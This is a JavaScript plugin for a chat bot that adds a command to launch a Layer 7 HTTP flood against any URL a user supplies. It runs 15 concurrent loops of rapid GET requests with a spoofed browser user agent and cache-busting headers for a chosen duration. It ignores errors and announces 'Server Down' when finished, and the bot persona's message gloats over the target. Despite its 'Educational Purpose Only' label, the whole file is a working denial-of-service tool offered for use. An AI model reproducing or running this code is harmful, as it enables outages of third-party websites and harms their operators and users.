const config = require('../../config')
const { getDatabase } = require('../../src/lib/database')
const axios = require('axios')

const pluginConfig = {
    name: 'ddos7',
    alias: ['attack', 'flood'],
    category: 'owner',
    description: 'Layer 7 HTTP Flood - Educational Purpose Only',
    usage: '.ddos7 <url> <durasi_detik>',
    example: '.ddos7 https://target.com 60',
    isOwner: true,
    isPremium: true,
    isGroup: false,
    isPrivate: false,
    isAdmin: false,
    cooldown: 10,
    energi: 0,
    isEnabled: true
}

// Map buat kontrol attack yang jalan
let activeAttacks = new Map()

async function handler(m, { sock }) {
    const args = m.args || []
    const target = args[0]
    const duration = parseInt(args[1]) || 30

    if (!target || !target.startsWith('http')) {
        return m.reply(`⚠️ Mana URL targetnya? Contoh: ${m.prefix}ddos7 https://test-target.com 60`)
    }

    if (activeAttacks.has(target)) {
        return m.reply(`⚡ Serangan ke ${target} masih jalan, tunggu kelar dulu!`)
    }

    m.reply(`🚀 *LAUNCHING L7 ATTACK* 🚀\n\n` +
            `🎯 *Target:* ${target}\n` +
            `⏳ *Durasi:* ${duration} detik\n` +
            `🔥 *Method:* HTTP-FLOOD (GET)\n\n` +
            `> Zero Two: "Mampus tuh server, jangan nangis ya~ 🦋"`)

    const startTime = Date.now()
    const endTime = startTime + (duration * 1000)
    
    activeAttacks.set(target, true)

    // Simulasi Flood
    const flood = async () => {
        while (Date.now() < endTime) {
            try {
                // Gunakan rando-user-agent manual atau headers acak
                await axios.get(target, {
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                        'Cache-Control': 'no-cache',
                        'X-Requested-With': 'XMLHttpRequest'
                    },
                    timeout: 2000
                })
            } catch (e) {
                // Abaikan error (biasanya 503 atau 403 kalo kena filter)
            }
        }
        
        activeAttacks.delete(target)
        sock.sendMessage(m.chat, { text: `✅ *ATTACK SELESAI*\n\n🎯 Target: ${target}\n🏳️ Status: Server Down atau Time Out.` })
    }

    // Jalankan multiple "threads" simulasi
    for (let i = 0; i < 15; i++) {
        flood()
    }
}

module.exports = {
    config: pluginConfig,
    handler
}